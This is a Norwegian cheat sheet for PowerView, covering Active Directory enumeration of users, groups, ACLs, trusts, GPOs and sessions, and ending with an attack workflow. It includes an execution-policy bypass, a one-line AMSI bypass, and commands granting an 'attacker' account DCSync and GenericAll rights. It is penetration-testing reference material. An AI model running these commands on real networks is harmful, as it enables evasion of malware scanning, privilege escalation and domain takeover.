# ⚡ PowerView – AD-kartlegging med PowerShell

<!-- language-home-navigation -->
[🏠 Norsk startside](../../README.nb.md) • [🌐 Languages](../../README.md#-available-languages)

[🇹🇷 Türkçe Sürüm](README.tr.md) • [🇬🇷 Ελληνικά](README.el.md)

> **Versjonsmerknad:** PowerView er en del av PowerSploit; prosjektets opprinnelige repo er arkivert. Funksjonsnavn i denne teksten stammer fra flere generasjoner, og PowerView følger ikke nødvendigvis med nyere SharpHound/BloodHound. Eksempelet for AMSI er versjonsavhengig og er ingen garanti for omgåelse. [PowerSploit](https://github.com/PowerShellMafia/PowerSploit), [nåværende SharpHound CE](https://bloodhound.specterops.io/collect-data/ce-collection/sharphound).
>
> **Presisering av eksemplene:** `Find-LocalAdminAccess` undersøker lokal administratortilgang, ikke brukerøkter. `-CheckShareAccess` beviser ikke alene skrivetilgang. `-ComputerIdentity` retter spørringen mot en datamaskin, selv om kommentaren omtaler en OU. `adminCount` alene beviser ikke nåværende privilegert gruppemedlemskap. En GPO er et gruppepolicyobjekt, en OU en organisasjonsenhet, og en ACL en tilgangskontrolliste. [PowerView-kilden](https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1).

```
  ██████╗  ██████╗ ██╗    ██╗███████╗██████╗ ██╗   ██╗██╗███████╗██╗    ██╗
  ██╔══██╗██╔═══██╗██║    ██║██╔════╝██╔══██╗██║   ██║██║██╔════╝██║    ██║
  ██████╔╝██║   ██║██║ █╗ ██║█████╗  ██████╔╝██║   ██║██║█████╗  ██║ █╗ ██║
  ██╔═══╝ ██║   ██║██║███╗██║██╔══╝  ██╔══██╗╚██╗ ██╔╝██║██╔══╝  ██║███╗██║
  ██║     ╚██████╔╝╚███╔███╔╝███████╗██║  ██║ ╚████╔╝ ██║███████╗╚███╔███╔╝
  ╚═╝      ╚═════╝  ╚══╝╚══╝ ╚══════╝╚═╝  ╚═╝  ╚═══╝  ╚═╝╚══════╝ ╚══╝╚══╝ 
                  Active Directory-kartlegging med PowerShell
```

<p align="center">
  <img src="https://img.shields.io/badge/PowerView-Active_Directory-blue?style=for-the-badge" alt="PowerView">
  <img src="https://img.shields.io/badge/PowerShell-red?style=for-the-badge" alt="PowerShell">
</p>

---

## 📋 Innholdsfortegnelse

- [Hva er PowerView](#-hva-er-powerview)
- [Oppsett](#-oppsett)
- [Domenekartlegging](#-domenekartlegging)
- [Brukerkartlegging](#-brukerkartlegging)
- [Gruppekartlegging](#-gruppekartlegging)
- [Datamaskinkartlegging](#-datamaskinkartlegging)
- [ACL-kartlegging](#-acl-kartlegging)
- [Kartlegging av tillitsforhold](#-kartlegging-av-tillitsforhold)
- [GPO-kartlegging](#-gpo-kartlegging)
- [Søk etter brukere og tilgang](#-søk-etter-brukere-og-tilgang)
- [Hurtigreferanse](#-hurtigreferanse)
- [Ressurser](#-ressurser)

---

## 🎯 Hva er PowerView

**PowerView** er et PowerShell-verktøy for AD-kartlegging og utnyttelse:

- 🔍 **Kartlegging** – Brukere, grupper, datamaskiner og GPO-er
- 🔐 **ACL-er** – Finn feilkonfigurerte rettigheter
- 🌐 **Tillitsforhold** – Kartlegg relasjoner mellom domener
- 🎯 **Søk etter brukere** – Finn hvor brukere er pålogget

---

## 🚀 Oppsett

### Last ned PowerView

```powershell
# Fra PowerSploit
https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1

# Fra SharpHound
# PowerView.ps1 følger med BloodHound
```

### Importer modul

```powershell
# Omgå kjøringspolicy
Set-ExecutionPolicy -Scope Process -ExecutionPolicy Bypass

# Importer
Import-Module .\PowerView.ps1

# Eller last inn med dot-sourcing
. .\PowerView.ps1
```

### Omgå AMSI (ved behov)

```powershell
# Enkel omgåelse
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
```

---

## 🏢 Domenekartlegging

### Grunnleggende domeneinformasjon

```powershell
# Hent domeneinformasjon
Get-Domain

# Hent domene-SID
Get-DomainSID

# Hent domenepolicy
Get-DomainPolicy

# Hent domenekontrollere
Get-DomainController
Get-DomainController -Domain other.domain.local

# Hent informasjon om skogen
Get-Forest
Get-ForestDomain
```

### Domenepolicy

```powershell
# Passordpolicy
(Get-DomainPolicy)."SystemAccess"

# Kerberos-policy
(Get-DomainPolicy)."KerberosPolicy"
```

---

## 👤 Brukerkartlegging

### List brukere

```powershell
# Alle brukere
Get-DomainUser

# Bestemt bruker
Get-DomainUser -Identity admin

# Brukeregenskaper
Get-DomainUser -Identity admin -Properties *
Get-DomainUser -Identity admin -Properties samaccountname,description

# Brukere med beskrivelser
Get-DomainUser -LDAPFilter "(description=*)" | Select-Object samaccountname,description
```

### Finn interessante brukere

```powershell
# Brukere med SPN (utsatt for Kerberoasting)
Get-DomainUser -SPN

# Brukere uten forhåndsautentisering (AS-REP)
Get-DomainUser -PreauthNotRequired

# Brukere med adminCount (beskyttet)
Get-DomainUser -AdminCount

# Brukere med passord i beskrivelsen
Get-DomainUser -LDAPFilter "(description=*pass*)" | Select-Object samaccountname,description
```

### Brukerøkter

```powershell
# Hvor er brukeren pålogget
Find-DomainUserLocation -UserIdentity admin

# Finn brukere med administratortilgang
Find-LocalAdminAccess
```

---

## 👥 Gruppekartlegging

### List grupper

```powershell
# Alle grupper
Get-DomainGroup

# Bestemt gruppe
Get-DomainGroup -Identity "Domain Admins"

# Gruppemedlemmer
Get-DomainGroupMember -Identity "Domain Admins"

# Medlemmer rekursivt
Get-DomainGroupMember -Identity "Domain Admins" -Recurse
```

### Viktige grupper

```powershell
# Domeneadministratorer
Get-DomainGroupMember -Identity "Domain Admins"

# Administratorer for hele skogen
Get-DomainGroupMember -Identity "Enterprise Admins"

# Administratorer
Get-DomainGroupMember -Identity "Administrators"

# Finn grupper brukeren tilhører
Get-DomainGroup -UserName admin
```

### Lokale grupper

```powershell
# Lokale administratorer på maskinen
Get-NetLocalGroupMember -ComputerName server01

# Lokale administratorer overalt
Find-DomainLocalGroupMember -GroupName Administrators
```

---

## 💻 Datamaskinkartlegging

### List datamaskiner

```powershell
# Alle datamaskiner
Get-DomainComputer

# Bestemt datamaskin
Get-DomainComputer -Identity server01

# Egenskaper
Get-DomainComputer -Properties operatingsystem,serviceprincipalname

# Datamaskiner med ubegrenset delegering
Get-DomainComputer -Unconstrained
```

### Finn mål

```powershell
# Domenekontrollere
Get-DomainController

# Servere
Get-DomainComputer -OperatingSystem "*Server*"

# Windows 10
Get-DomainComputer -OperatingSystem "*Windows 10*"

# Gammelt operativsystem
Get-DomainComputer -OperatingSystem "*2008*"
```

### Delinger

```powershell
# Finn delinger
Find-DomainShare

# Skrivbare delinger
Find-DomainShare -CheckShareAccess

# Interessante filer i delinger
Find-InterestingDomainShareFile
Find-InterestingDomainShareFile -Include *.txt,*.doc,*.xlsx
```

---

## 🔐 ACL-kartlegging

### Grunnleggende ACL

```powershell
# ACL for bruker
Get-DomainObjectAcl -Identity admin

# Slå opp GUID-er
Get-DomainObjectAcl -Identity admin -ResolveGUIDs

# Bestemte rettigheter
Get-DomainObjectAcl -Identity admin -ResolveGUIDs | ? {$_.ActiveDirectoryRights -match "GenericAll"}
```

### Finn interessante ACL-er

```powershell
# GenericAll på bruker
Get-DomainObjectAcl -ResolveGUIDs | ? {$_.ActiveDirectoryRights -match "GenericAll" -and $_.SecurityIdentifier -match "S-1-5-21-.*-1107"}

# WriteProperty
Get-DomainObjectAcl -ResolveGUIDs | ? {$_.ActiveDirectoryRights -match "WriteProperty"}

# WriteDacl
Get-DomainObjectAcl -ResolveGUIDs | ? {$_.ActiveDirectoryRights -match "WriteDacl"}
```

### DCSync-rettigheter

```powershell
# Finn DCSync-rettigheter
Get-DomainObjectAcl -SearchBase "DC=domain,DC=local" -ResolveGUIDs | ? {($_.ObjectAceType -match "Replication-Get") -or ($_.ActiveDirectoryRights -match "GenericAll")}
```

### Endre ACL

```powershell
# Legg til GenericAll for bruker
Add-DomainObjectAcl -TargetIdentity "Domain Admins" -PrincipalIdentity attacker -Rights All

# Legg til DCSync-rettigheter
Add-DomainObjectAcl -TargetIdentity "DC=domain,DC=local" -PrincipalIdentity attacker -Rights DCSync
```

---

## 🤝 Kartlegging av tillitsforhold

### Domenetillitsforhold

```powershell
# Hent tillitsforhold
Get-DomainTrust

# Alle tillitsforhold
Get-DomainTrust -Domain domain.local

# Kartlegg alle tillitsforhold
Get-DomainTrustMapping
```

### Tillitsforhold mellom skoger

```powershell
# Tillitsforhold mellom skoger
Get-ForestTrust

# Domener i skogen
Get-ForestDomain
```

### Typer tillitsforhold

| Tillitstype | Retning | Beskrivelse |
|------------|-----------|-------------|
| Toveis | Begge veier | Begge domener stoler på hverandre |
| Innkommende | Én vei | Det andre domenet stoler på oss |
| Utgående | Én vei | Vi stoler på det andre domenet |

---

## 📜 GPO-kartlegging

### List GPO-er

```powershell
# Alle GPO-er
Get-DomainGPO

# GPO etter navn
Get-DomainGPO -Identity "Default Domain Policy"

# GPO-er på bestemt OU
Get-DomainGPO -ComputerIdentity server01
```

### Finn GPO-rettigheter

```powershell
# GPO som brukeren kan endre
Get-DomainGPO | Get-DomainObjectAcl -ResolveGUIDs | ? {$_.ActiveDirectoryRights -match "WriteProperty" -or $_.ActiveDirectoryRights -match "GenericAll"}
```

### GPO-plasseringer

```powershell
# OU-er som GPO-en gjelder for
Get-DomainOU -GPLink "{GPO-GUID}"

# GPO på bestemt datamaskin
Get-DomainGPO -ComputerIdentity "server01"
```

---

## 🎯 Søk etter brukere og tilgang

### Finn administratortilgang

```powershell
# Hvor har vi lokale administratorrettigheter?
Find-LocalAdminAccess

# Med flere tråder
Find-LocalAdminAccess -Threads 10

# På bestemte datamaskiner
Find-LocalAdminAccess -ComputerFile computers.txt
```

### Finn brukernes plassering

```powershell
# Hvor er brukeren pålogget?
Find-DomainUserLocation

# Bestemt bruker
Find-DomainUserLocation -UserIdentity admin

# Bare datamaskiner der vi har tilgang
Find-DomainUserLocation -CheckAccess
```

### Finn økter

```powershell
# Økter på maskinen
Get-NetSession -ComputerName dc01

# Påloggede brukere
Get-NetLoggedon -ComputerName server01

# RDP-økter
Get-NetRDPSession -ComputerName server01
```

### Søk etter bestemte brukere

```powershell
# Finn domeneadministratorer
Find-DomainUserLocation -UserGroupIdentity "Domain Admins"

# Kontroller hvor de er pålogget
Invoke-UserHunter

# Diskret modus
Invoke-UserHunter -Stealth
```

---

## 📊 Hurtigreferanse

### Viktige kommandoer

| Kommando | Beskrivelse |
|---------|-------------|
| `Get-Domain` | Domeneinformasjon |
| `Get-DomainUser` | List brukere |
| `Get-DomainGroup` | List grupper |
| `Get-DomainComputer` | List datamaskiner |
| `Get-DomainController` | List domenekontrollere |
| `Get-DomainTrust` | List tillitsforhold |
| `Get-DomainGPO` | List GPO-er |
| `Find-LocalAdminAccess` | Finn administratortilgang |
| `Find-DomainUserLocation` | Finn brukerøkter |

### Kerberos-mål

| Kommando | Beskrivelse |
|---------|-------------|
| `Get-DomainUser -SPN` | Utsatt for Kerberoasting |
| `Get-DomainUser -PreauthNotRequired` | Utsatt for AS-REP roasting |
| `Get-DomainComputer -Unconstrained` | Ubegrenset delegering |

### Vanlige filtre

```powershell
# Filtrer etter egenskap
Get-DomainUser -Properties samaccountname,description

# LDAP-filter
Get-DomainUser -LDAPFilter "(description=*admin*)"

# Where-betingelse
Get-DomainUser | ? {$_.samaccountname -like "*svc*"}
```

### Angrepsarbeidsflyt

```powershell
# 1. Importer
Import-Module .\PowerView.ps1

# 2. Kartlegg domenet
Get-Domain
Get-DomainController

# 3. Finn brukere
Get-DomainUser -SPN | Select samaccountname
Get-DomainUser -PreauthNotRequired

# 4. Finn administratortilgang
Find-LocalAdminAccess

# 5. Søk etter brukere
Find-DomainUserLocation -UserGroupIdentity "Domain Admins"

# 6. Kontroller ACL-er
Get-DomainObjectAcl -Identity admin -ResolveGUIDs
```

---

## 📚 Ressurser

- [PowerView GitHub](https://github.com/PowerShellMafia/PowerSploit)
- [HarmJ0y Blog](https://blog.harmj0y.net/)
- [PowerView-hurtigreferanse](https://gist.github.com/HarmJ0y/184f9822b195c52dd50c379ed3117993)

### Relaterte hurtigreferanser
- [BloodHound](../../BloodHound/translations/README.nb.md)
- [PowerShell](../../PowerShell/translations/README.nb.md)
- [Mimikatz](../../Mimikatz/translations/README.nb.md)

---

<p align="center">
  <b>⚡ AD-kartlegging med PowerShell!</b><br>
  <i>PowerView – det klassiske verktøyet for AD-kartlegging</i>
</p>
